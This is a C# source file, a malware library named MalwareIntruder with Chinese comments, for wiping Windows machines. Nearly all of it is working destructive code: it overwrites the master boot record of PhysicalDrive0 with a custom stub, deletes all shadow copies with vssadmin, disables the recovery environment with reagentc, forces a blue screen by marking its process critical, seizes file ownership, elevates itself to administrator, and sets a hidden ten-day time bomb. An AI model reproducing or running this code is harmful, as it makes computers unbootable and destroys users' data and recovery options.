using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading.Tasks;
using System.Windows.Forms;
using HANDLE = System.IntPtr;

namespace VortexSecOps
{
    namespace HarmfulSysHacks
    {
        /// <summary>
        /// Windows API 常量
        /// </summary>
        public enum Windows_API_Constants:uint
        {
            // 文件共享模式
            /// <summary>
            /// 文件共享读取模式
            /// </summary>
            File_Share_Read = 0x00000001,
            /// <summary>
            /// 文件共享写入模式
            /// </summary>
            File_Share_Write = 0x00000002,

            // 文件访问权限
            /// <summary>
            /// 通用读取访问权限
            /// </summary>
            Generic_Read = 0x80000000,
            /// <summary>
            /// 通用写入访问权限
            /// </summary>
            Generic_Write = 0x40000000,

            // 文件创建操作
            /// <summary>
            /// 打开已存在的文件
            /// </summary>
            Open_Existing = 3,
        }
        /// <summary>
        /// 定义了与 Windows API 操作相关的接口，继承自 <see cref="IConfigCorrupter"/> 接口。
        /// </summary>
        public interface IWindowsAPIOperator : IConfigCorrupter
        {
            bool CloseHandle(HANDLE hObject);
            /// <summary>
            /// 将数据写入指定的文件或输入/输出（I/O）设备。
            /// </summary>
            /// <param name="hFile">要写入数据的文件句柄。</param>
            /// <param name="lpBuffer">指向包含要写入数据的缓冲区的指针。</param>
            /// <param name="nNumberOfBytesToWrite">要从缓冲区写入的字节数。</param>
            /// <param name="lpNumberOfBytesWritten">指向一个变量的指针，该变量用于接收实际写入的字节数。</param>
            /// <param name="lpOverlapped">指向OVERLAPPED结构的指针（若适用）。</param>
            /// <returns>
            /// 函数如果成功，则返回true；函数如果失败，则返回false。
            /// </returns>
            bool WriteFile(HANDLE hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpNumberOfBytesWritten, IntPtr lpOverlapped);
            /// <summary>
            /// 创建或打开文件或I/O设备。
            /// </summary>
            /// <param name="lpFileName">要创建或打开的文件或设备的名称。</param>
            /// <param name="dwDesiredAccess">对文件或设备期望的访问权限。</param>
            /// <param name="dwShareMode">文件或设备的共享模式。</param>
            /// <param name="lpSecurityAttributes">指向SECURITY_ATTRIBUTES结构的指针，用于确定文件或设备的安全属性。</param>
            /// <param name="dwCreationDisposition">当文件或设备存在与否时应采取的操作。</param>
            /// <param name="dwFlagsAndAttributes">文件或设备的属性及标志。</param>
            /// <param name="hTemplateFile">指向模板文件的句柄（若适用）。</param>
            /// <returns></returns>
            HANDLE CreateFileA(string lpFileName, Windows_API_Constants dwDesiredAccess, Windows_API_Constants dwShareMode, uint lpSecurityAttributes, Windows_API_Constants dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
            /// <summary>
            /// 从指定的文件或输入/输出（I/O）设备读取数据。 如果设备支持，则读取发生在文件指针指定的位置。
            /// </summary>
            /// <param name="hFile">设备的句柄（例如文件、文件流、物理磁盘、卷、控制台缓冲区、磁带驱动器、套接字、通信资源、mailslot 或管道）。</param>
            /// <param name="lpBuffer">指向接收从文件或设备读取的数据的缓冲区的指针。</param>
            /// <param name="nNumberOfBytesToRead">要读取的最大字节数。</param>
            /// <param name="lpNumberOfBytesRead">指向使用同步 hFile 参数时接收读取的字节数的变量的指针。</param>
            /// <param name="lpOverlapped">
            /// 指向 <see cref="OVERLAPPED"/> 结构体的指针
            /// </param>
            /// <returns>
            /// 如果函数成功，返回值为非零值（表示 <c>true</c>）。
            /// 如果函数失败，返回值为零（表示 <c>false</c>）。
            /// </returns>
            bool ReadFile(HANDLE hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, ref uint lpNumberOfBytesRead, IntPtr lpOverlapped);
            /// <summary>
            /// 修改主引导记录（MBR）。
            /// </summary>
            /// <returns>如果修改成功，返回 <c>true</c>；否则返回 <c>false</c>。</returns>
            bool ModifyMasterBootRecord();
            /// <summary>
            /// 将指定的字节数组数据写入主引导记录（MBR）。
            /// </summary>
            /// <param name="buffer">要写入 MBR 的字节数组数据。</param>
            /// <returns>如果写入成功，返回 <c>true</c>；否则返回 <c>false</c>。</returns>
            bool WriteToMasterBootRecord(byte[] buffer);
        }
        /// <summary>
        /// 定义了常规操作相关的接口，继承自 <see cref="IConfigCorrupter"/> 接口。
        /// </summary>
        public interface INormalOperator : IConfigCorrupter
        {
            /// <summary>
            /// 修改主引导记录（MBR）。
            /// </summary>
            void ModifyMasterBootRecord();
            /// <summary>
            /// 将指定的字节数组数据写入主引导记录（MBR）。
            /// </summary>
            /// <param name="buffer">要写入 MBR 的字节数组数据。</param>
            void WriteToMasterBootRecord(byte[] buffer);
        }
        /// <summary>
        /// 定义了配置破坏相关操作的接口。
        /// </summary>
        public interface IConfigCorrupter
        {
            /// <summary>
            /// 删除所有卷影副本
            /// </summary>
            void DeleteAllRestorePoints();
            /// <summary>
            /// 触发系统蓝屏。
            /// </summary>
            void TriggerBlueScreen();
            /// <summary>
            /// 禁用 Windows 恢复环境。
            /// </summary>
            void DisableWindowsRecoveryEnvironment();
            /// <summary>
            /// 重启计算机。
            /// </summary>
            void RestartComputer();

        }

        // 此类包含了被恶意程序使用的与系统级别操作相关的多个方法
        public class MalwareIntruder
        {
            // 私有构造函数，防止外部实例化
            private MalwareIntruder() { }
            // 定义 MBR 备份文件的路径
            private const string MBR_PATH = @"C:\bin\mbr.bin";
            /// <summary>
            /// 从指定的文件或输入/输出（I/O）设备读取数据。 如果设备支持，则读取发生在文件指针指定的位置。
            /// </summary>
            /// <param name="hFile">设备的句柄（例如文件、文件流、物理磁盘、卷、控制台缓冲区、磁带驱动器、套接字、通信资源、mailslot 或管道）。</param>
            /// <param name="lpBuffer">指向接收从文件或设备读取的数据的缓冲区的指针。</param>
            /// <param name="nNumberOfBytesToRead">要读取的最大字节数。</param>
            /// <param name="lpNumberOfBytesRead">指向使用同步 hFile 参数时接收读取的字节数的变量的指针。</param>
            /// <param name="lpOverlapped">
            /// 指向 <see cref="OVERLAPPED"/> 结构体的指针
            /// </param>
            /// <returns>
            /// 如果函数成功，返回值为非零值（表示 <c>true</c>）。
            /// 如果函数失败，返回值为零（表示 <c>false</c>）。
            /// </returns>
            [DllImport("kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool ReadFile(HANDLE hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, ref uint lpNumberOfBytesRead, IntPtr lpOverlapped);

            /// <summary>
            /// 创建或打开文件或I/O设备。
            /// </summary>
            /// <param name="lpFileName">要创建或打开的文件或设备的名称。</param>
            /// <param name="dwDesiredAccess">对文件或设备期望的访问权限。</param>
            /// <param name="dwShareMode">文件或设备的共享模式。</param>
            /// <param name="lpSecurityAttributes">指向SECURITY_ATTRIBUTES结构的指针，用于确定文件或设备的安全属性。</param>
            /// <param name="dwCreationDisposition">当文件或设备存在与否时应采取的操作。</param>
            /// <param name="dwFlagsAndAttributes">文件或设备的属性及标志。</param>
            /// <param name="hTemplateFile">指向模板文件的句柄（若适用）。</param>
            /// <returns></returns>
            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern HANDLE CreateFileA(string lpFileName, uint dwDesiredAccess, uint dwShareMode, uint lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

            /// <summary>
            /// 将数据写入指定的文件或输入/输出（I/O）设备。
            /// </summary>
            /// <param name="hFile">要写入数据的文件句柄。</param>
            /// <param name="lpBuffer">指向包含要写入数据的缓冲区的指针。</param>
            /// <param name="nNumberOfBytesToWrite">要从缓冲区写入的字节数。</param>
            /// <param name="lpNumberOfBytesWritten">指向一个变量的指针，该变量用于接收实际写入的字节数。</param>
            /// <param name="lpOverlapped">指向OVERLAPPED结构的指针（若适用）。</param>
            /// <returns>
            /// 函数如果成功，则返回true；函数如果失败，则返回false。
            /// </returns>
            [DllImport("kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool WriteFile(HANDLE hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpNumberOfBytesWritten, IntPtr lpOverlapped);

            // 定义文件共享模式常量
            private const int File_Share_Read = 0x00000001;
            private const int File_Share_Write = 0x00000002;
            // 定义文件访问权限常量
            private const uint Generic_Read = 0x80000000;
            private const uint Generic_Write = 0x40000000;
            // 定义文件创建操作常量
            private const int Open_Existing = 3;

            // 关闭句柄的 Windows API 函数
            [DllImport("kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private extern static bool CloseHandle(HANDLE hObject);
            /// <summary>
            /// 用于设置进程信息。
            /// </summary>
            /// <param name="hProcess">进程的句柄。</param>
            /// <param name="processInformationClass">要设置的进程信息类型。</param>
            /// <param name="processInformation">指向包含要设置的进程信息的缓冲区的指针。</param>
            /// <param name="processInformationLength">进程信息缓冲区的长度。</param>
            /// <returns></returns>
            [DllImport("ntdll.dll", SetLastError = true)]
            private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
            /// <summary>
            /// 获取指定的文件所有权，并执行操作
            /// </summary>
            /// <param name="iFile">文件路径</param>
            /// <param name="action">获取到所有权后执行的操作</param>
            public static void TakeOwnershipOfFile(string iFile, Action<string> action)
            {
                ProcessStartInfo takeownPsi = new ProcessStartInfo
                {
                    FileName = "takeown.exe",
                    Arguments = $"/f \"{iFile}\" /A",
                    Verb = "runas",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(takeownPsi).WaitForExit();
                ProcessStartInfo icaclsPsi = new ProcessStartInfo
                {
                    FileName = "icacls.exe",
                    Arguments = $"\"{iFile}\" /grant Everyone:F",
                    Verb = "runas",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(icaclsPsi).WaitForExit();
                action.Invoke(iFile);
            }
            /// <summary>
            /// 获取指定的文件所有权
            /// </summary>
            /// <param name="iFile">文件路径</param>
            public static void TakeOwnershipOfFile(string iFile)
            {
                ProcessStartInfo takeownPsi = new ProcessStartInfo
                {
                    FileName = "takeown.exe",
                    Arguments = $"/f \"{iFile}\" /A",
                    Verb = "runas",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(takeownPsi).WaitForExit();
                ProcessStartInfo icaclsPsi = new ProcessStartInfo
                {
                    FileName = "icacls.exe",
                    Arguments = $"\"{iFile}\" /grant Everyone:F",
                    Verb = "runas",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(icaclsPsi).WaitForExit();
            }
            /// <summary>
            /// 如果MBR备份文件不存在，就通过Windows API读取MBR，并写入备份文件中；
            /// 如果存在，就获取MBR。
            /// </summary>
            /// <returns>获取到的MBR</returns>
            public static byte[] GetMbrUsingWindowsAPI()
            {
                // 定义物理驱动器的路径
                string physicalDrivePath = @"\\.\PhysicalDrive0";
                // 用于存储实际读取的字节数
                uint bytesRead = 0;
                // 空值常量
                uint NULL_VALUE = 0;
                // 用于存储 MBR 数据的字节数组
                byte[] masterBootRecordData = new byte[512];
                // 定义 MBR 存储文件夹的路径
                const string MBR_STORAGE_PATH = @"C:\bin";
                // 检查 MBR 存储文件夹是否存在，如果不存在则创建
                if (!Directory.Exists(MBR_STORAGE_PATH))
                {
                    Directory.CreateDirectory(MBR_STORAGE_PATH);
                }
                // 检查 MBR 备份文件是否存在
                if (!File.Exists(MBR_PATH))
                {
                    // 打开物理驱动器的句柄
                    HANDLE handle = CreateFileA(physicalDrivePath, Generic_Read, File_Share_Read, NULL_VALUE, Open_Existing, NULL_VALUE, IntPtr.Zero);
                    if (handle != IntPtr.Zero)
                    {
                        // 从物理驱动器读取 MBR 数据
                        if (ReadFile(handle, masterBootRecordData, 512, ref bytesRead, IntPtr.Zero))
                        {
                            try
                            {
                                // 创建或打开 MBR 备份文件并写入数据
                                using (FileStream fileStream = new FileStream(MBR_PATH, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite))
                                {
                                    fileStream.Write(masterBootRecordData, 0, 512);
                                }
                            }
                            catch (Exception)
                            {
                                // 发生异常时返回 null
                                return null;
                            }
                            finally
                            {
                                // 关闭句柄
                                CloseHandle(handle);
                            }
                        }
                        else
                        {
                            // 读取失败时关闭句柄并返回 null
                            CloseHandle(handle);
                            return null;
                        }
                    }
                    else
                    {
                        // 打开句柄失败时返回 null
                        return null;
                    }
                }
                try
                {
                    // 重新初始化 MBR 数据数组
                    masterBootRecordData = new byte[512];
                    // 从 MBR 备份文件中读取数据
                    using (FileStream fileStream = new FileStream(MBR_PATH, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        fileStream.Read(masterBootRecordData, 0, 512);
                    }
                    return masterBootRecordData;
                }
                catch (Exception)
                {
                    // 发生异常时返回 null
                    return null;
                }
            }

            // 通过文件流获取 MBR 数据
            public static byte[] GetMbrByFileStream()
            {
                // 定义物理驱动器的路径
                string physicalDrivePath = @"\\.\PhysicalDrive0";
                // 用于存储 MBR 数据的字节数组
                byte[] masterBootRecordData = new byte[512];
                // 定义 MBR 存储文件夹的路径
                const string MBR_STORAGE_PATH = @"C:\bin";
                // 检查 MBR 存储文件夹是否存在，如果不存在则创建
                if (!Directory.Exists(MBR_STORAGE_PATH))
                {
                    DirectoryInfo directory = new DirectoryInfo(MBR_STORAGE_PATH);
                    directory.Create();
                }
                // 获取 MBR 备份文件的信息
                FileInfo mbrFileInfo = new FileInfo(MBR_PATH);
                if (!mbrFileInfo.Exists)
                {
                    // 打开物理驱动器的文件流并读取 MBR 数据
                    using (FileStream fileStream = new FileStream(physicalDrivePath, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        fileStream.Read(masterBootRecordData, 0, 512);
                    }
                    // 创建或打开 MBR 备份文件并写入数据
                    using (FileStream fileStream1 = new FileStream(MBR_PATH, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        fileStream1.Write(masterBootRecordData, 0, 512);
                    }
                    // 将 MBR 数据数组清零
                    for (int i = 0; i < 512; i++)
                    {
                        masterBootRecordData[i] = 0;
                    }
                }
                // 从 MBR 备份文件中读取数据
                using (FileStream fileStream2 = new FileStream(MBR_PATH, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
                {
                    fileStream2.Read(masterBootRecordData, 0, 512);
                }
                return masterBootRecordData;
            }

            // 异步检查时间是否到达指定日期
            public static async Task<bool> CheckTimeAsync(string filename = @"time.txt", int daysLater = 10)
            {
                // 定义时间文件存储文件夹的路径
                const string TIME_FOLDER_PATH = @"C:\time8597";
                // 构建时间文件的完整路径
                string timeFilePath = Path.Combine(TIME_FOLDER_PATH, filename);
                // 获取时间文件存储文件夹的信息
                DirectoryInfo directory = new DirectoryInfo(TIME_FOLDER_PATH);
                // 检查时间文件存储文件夹是否存在，如果不存在则创建
                if (!directory.Exists)
                {
                    directory.Create();
                }
                // 将时间文件存储文件夹设置为隐藏属性
                directory.Attributes = FileAttributes.Hidden;
                if (!File.Exists(timeFilePath))
                {
                    // 计算指定天数后的日期
                    DateTime futureDateTime = DateTime.Now.AddDays(daysLater);
                    // 将日期信息写入时间文件
                    File.WriteAllText(timeFilePath, $"{futureDateTime.Year}--time--{futureDateTime.Month}--time--{futureDateTime.Day}");
                }
                // 读取时间文件中的日期信息
                string storedTimeString = File.ReadAllText(timeFilePath);
                // 定义分隔符数组
                string[] splits = { "--time--" };
                // 分割日期信息字符串
                string[] dateComponents = storedTimeString.Split(splits, StringSplitOptions.None);
                // 获取年份
                int year = Convert.ToInt32(dateComponents[0]);
                // 获取月份
                int month = Convert.ToInt32(dateComponents[1]);
                // 获取日期
                int day = Convert.ToInt32(dateComponents[2]);
                // 构建目标日期对象
                DateTime targetDateTime = new DateTime(year, month, day);
                while (true)
                {
                    // 获取当前日期时间
                    DateTime now = DateTime.Now;
                    if (now >= targetDateTime)
                    {
                        // 如果当前日期时间大于等于目标日期时间，返回 true
                        return true;
                    }
                    // 异步延迟 200 毫秒
                    await Task.Delay(200);
                }
            }

            /// <summary>
            /// 检测是否为管理员身份运行
            /// </summary>
            /// <returns>是管理员返回 true，不是则为 false</returns>
            public static bool IsRunningAsAdministrator()
            {
                // 获取当前用户的身份信息
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                // 创建 Windows 主体对象
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                // 检查是否为管理员角色
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }

            /// <summary>
            /// 以管理员身份运行自身进程
            /// </summary>
            public static void RestartCurrentAppAsAdmin()
            {
                // 创建进程启动信息对象
                ProcessStartInfo startInfo = new ProcessStartInfo();
                // 设置要启动的进程的文件名
                startInfo.FileName = Process.GetCurrentProcess().MainModule.FileName;
                // 设置以管理员身份运行
                startInfo.Verb = "runas";
                try
                {
                    // 启动进程
                    Process.Start(startInfo);
                }
                catch (Exception ex)
                {
                    // 捕获异常并显示错误消息框
                    MessageBox.Show(ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                finally
                {
                    // 退出当前进程
                    Environment.Exit(0);
                }
            }

            // 内部类，实现了多个接口，用于执行各种系统操作
            private class OpMaster : INormalOperator, IWindowsAPIOperator, IConfigCorrupter
            {
                bool IWindowsAPIOperator.CloseHandle(HANDLE hObject)
                {
                    return CloseHandle(hObject);
                }
                bool IWindowsAPIOperator.WriteFile(HANDLE hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpNumberOfBytesWritten, IntPtr lpOverlapped)
                {
                    return WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, ref lpNumberOfBytesWritten, lpOverlapped);
                }
                HANDLE IWindowsAPIOperator.CreateFileA(string lpFileName, Windows_API_Constants dwDesiredAccess, Windows_API_Constants dwShareMode, uint lpSecurityAttributes, Windows_API_Constants dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile)
                {
                    return CreateFileA(lpFileName, (uint)dwDesiredAccess, (uint)dwShareMode, lpSecurityAttributes, (uint)dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
                }
                bool IWindowsAPIOperator.ReadFile(HANDLE hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, ref uint lpNumberOfBytesRead, System.IntPtr lpOverlapped)
                {
                    return ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, ref lpNumberOfBytesRead, lpOverlapped);
                }
                // 用于触发蓝屏的方法
                void IConfigCorrupter.TriggerBlueScreen()
                {
                    // 设置进程为关键进程
                    int isCritical = 1;
                    // 定义 BreakOnTermination 常量
                    int BreakOnTermination = 29;
                    // 调用 Windows API 设置进程信息
                    NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                    // 退出当前进程
                    Environment.Exit(0);
                }

                // 修改主引导记录（MBR）
                void INormalOperator.ModifyMasterBootRecord()
                {
                    // 定义初始的 MBR 数据
                    byte[] initialMbrData = { 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xBD, 0x17, 0x7C, 0xB9, 0x03, 0x00, 0xB8, 0x01, 0x13, 0xBB, 0x0C, 0x00, 0xBA, 0x1D, 0x0E, 0xCD, 0x10, 0xC3, 0x54, 0x76, 0x54 };
                    // 创建一个 512 字节的 MBR 数据数组
                    byte[] mbrdata = new byte[512];
                    // 将初始 MBR 数据复制到 MBR 数据数组中
                    for (int i = 0; i < initialMbrData.Length; i++)
                    {
                        mbrdata[i] = initialMbrData[i];
                    }
                    // 设置 MBR 数据的最后两个字节
                    mbrdata[510] = 0x55;
                    mbrdata[511] = 0xAA;
                    // 定义物理驱动器的路径
                    string physicalDrivePath = @"\\.\PhysicalDrive0";
                    // 打开物理驱动器的文件流并写入 MBR 数据
                    using (FileStream file = new FileStream(physicalDrivePath, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        file.Write(mbrdata, 0, 512);
                    }
                }

                // 使用Windows API修改（MBR）
                bool IWindowsAPIOperator.ModifyMasterBootRecord()
                {
                    // 定义物理驱动器的路径
                    const string physicalDrivePath = @"\\.\PhysicalDrive0";
                    // 用于存储实际写入的字节数
                    int bytesWritten = 0;
                    // 空值常量
                    uint NULL_VALUE = 0;
                    // 定义初始的 MBR 数据
                    byte[] initialMbrData = { 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xBD, 0x17, 0x7C, 0xB9, 0x03, 0x00, 0xB8, 0x01, 0x13, 0xBB, 0x0C, 0x00, 0xBA, 0x1D, 0x0E, 0xCD, 0x10, 0xC3, 0x54, 0x76, 0x54 };
                    // 创建一个 512 字节的 MBR 数据数组
                    byte[] masterBootRecordData = new byte[512];
                    // 将初始 MBR 数据复制到 MBR 数据数组中
                    for (int i = 0; i < initialMbrData.Length; i++)
                    {
                        masterBootRecordData[i] = initialMbrData[i];
                    }
                    // 设置 MBR 数据的最后两个字节
                    masterBootRecordData[510] = 0x55;
                    masterBootRecordData[511] = 0xAA;
                    // 打开物理驱动器的句柄
                    HANDLE masterBootRecord = CreateFileA(physicalDrivePath, Generic_Read | Generic_Write, File_Share_Read | File_Share_Write, NULL_VALUE, Open_Existing, NULL_VALUE, HANDLE.Zero);
                    // 写入 MBR 数据
                    bool isWriteSuccessful = WriteFile(masterBootRecord, masterBootRecordData, 512, ref bytesWritten, IntPtr.Zero);
                    if (masterBootRecord != IntPtr.Zero)
                    {
                        // 关闭句柄
                        CloseHandle(masterBootRecord);
                    }
                    return isWriteSuccessful;
                }
                void IConfigCorrupter.DeleteAllRestorePoints()
                {
                    // 创建进程启动信息对象
                    ProcessStartInfo startInfo = new ProcessStartInfo()
                    {
                        // 设置要启动的进程的文件名
                        FileName = @"vssadmin.exe",
                        // 设置删除所有卷影副本的参数
                        Arguments = "delete shadows /all /quiet",
                        //以管理员身份运行此进程
                        Verb = "runas",
                        // 不使用 shell 执行
                        UseShellExecute = false,
                        // 不创建窗口
                        CreateNoWindow = true,
                    };
                    // 启动进程
                    Process.Start(startInfo).WaitForExit();
                }
                // 用于重启计算机的方法
                void IConfigCorrupter.RestartComputer()
                {
                    // 创建进程启动信息对象
                    ProcessStartInfo startInfo = new ProcessStartInfo()
                    {
                        // 设置要启动的进程的文件名
                        FileName = @"shutdown.exe",
                        // 设置重启计算机的参数
                        Arguments = "/r /t 0",
                        // 不使用 shell 执行
                        UseShellExecute = false,
                        // 不创建窗口
                        CreateNoWindow = true,
                    };
                    // 启动进程
                    Process.Start(startInfo);
                }

                // 禁用Windows恢复环境
                void IConfigCorrupter.DisableWindowsRecoveryEnvironment()
                {
                    // 创建进程启动信息对象
                    ProcessStartInfo startInfo = new ProcessStartInfo()
                    {
                        // 设置要启动的进程的文件名
                        FileName = @"reagentc.exe",
                        // 设置禁用 Windows 恢复环境的参数
                        Arguments = @"/disable",
                        // 不创建窗口
                        CreateNoWindow = true,
                        // 不使用 shell 执行
                        UseShellExecute = false,
                    };
                    // 启动进程
                    Process.Start(startInfo).WaitForExit();
                }

                // 将传入的MBR数据写入物理驱动器
                void INormalOperator.WriteToMasterBootRecord(byte[] buffer)
                {
                    // 定义物理驱动器的路径
                    string path = @"\\.\PhysicalDrive0";
                    // 打开物理驱动器的文件流并写入 MBR 数据
                    using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        fileStream.Write(buffer, 0, 512);
                    }
                }

                // 使用 Windows API 将传入的 MBR 数据写入物理驱动器
                bool IWindowsAPIOperator.WriteToMasterBootRecord(byte[] buffer)
                {
                    // 定义物理驱动器的路径
                    string path = @"\\.\PhysicalDrive0";
                    // 用于存储实际写入的字节数
                    int write = 0;
                    // 句柄初始化为零
                    HANDLE handle = IntPtr.Zero;
                    try
                    {
                        // 打开物理驱动器的句柄
                        handle = CreateFileA(path, Generic_Read | Generic_Write,
                                    File_Share_Read | File_Share_Write,
                                    0, Open_Existing,
                                    0, IntPtr.Zero);
                        if (handle != IntPtr.Zero)
                        {
                            // 写入 MBR 数据
                            if (WriteFile(handle, buffer, 512, ref write, IntPtr.Zero))
                            {
                                // 关闭句柄
                                CloseHandle(handle);
                                return true;
                            }
                        }
                    }
                    finally
                    {
                        if (handle != IntPtr.Zero)
                        {
                            // 关闭句柄
                            CloseHandle(handle);
                        }
                    }
                    return false;
                }
            }

            // 创建指定接口类型的实例
            public static T Create<T>() where T : class
            {
                if (typeof(T) == typeof(IWindowsAPIOperator) || typeof(T) == typeof(INormalOperator) || typeof(T) == typeof(IConfigCorrupter))
                {
                    // 如果是指定的接口类型，则创建 OpMaster 实例并转换为指定类型
                    return new OpMaster() as T;
                }
                return null;
            }
        }
    }
}